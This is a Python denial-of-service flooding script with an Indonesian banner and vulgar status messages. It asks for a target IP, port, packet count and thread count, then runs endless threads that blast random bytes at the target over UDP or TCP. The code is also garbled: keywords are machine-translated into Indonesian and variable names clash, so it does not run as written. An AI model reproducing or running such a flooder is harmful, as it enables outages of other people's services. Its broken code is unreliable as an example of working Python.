kami#!/usr/bin/env python3

#Penulis : Leon

impor acak

soket impor

benang impor

impor os

sistem impor

os.system("hapus")

print("Buat Ulang Oleh : Ndag Og")

cetak("░░██╗██╗███████╗██╗░██████╗")

cetak("░██╔╝██║╚════██║██║██╔════╝")

cetak("██╔╝░██║░░███╔═╝██║╚█████╗░")

cetak("███████║██╔══╝░░██║░╚═══██╗")

cetak("╚════██║███████╗██║██████╔╝")

cetak("░░░░░╚═╝╚══════╝╚═╝╚═════╝░")

  

ip = str(input("Target IP:"))

port = int(input("Target Pelabuhan:"))

pilihan = str(input("Gasken Gak(y/n):"))

kali = int(input("Paket :"))

benang = int(input("Utas:"))

def menjalankan():

	data = acak._urandom(1189)

	i = random.choice(("[4ZIS NIH BOSS]","[4ZIS NIH BOS]"))

	sementara Benar:

		mencoba:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print(i +" SENGGOL DONG !!! ")

		except:

			print("[KONTOL] DOWN BWANG WKWK")

def run2():

	data = random._urandom(6)

	i = random.choice(("[4ZIS NIH BOS]","[4ZIS NIH BOS]","[4ZIS NIH BOS]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print(i +" SENGGOL DONG !!! ")

		except:

			s.close()

			print("[KONTOL] DOWN BWANG WKWK")

            

for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

	else:

		th = threading.Thread(target = run2)

		th.start()
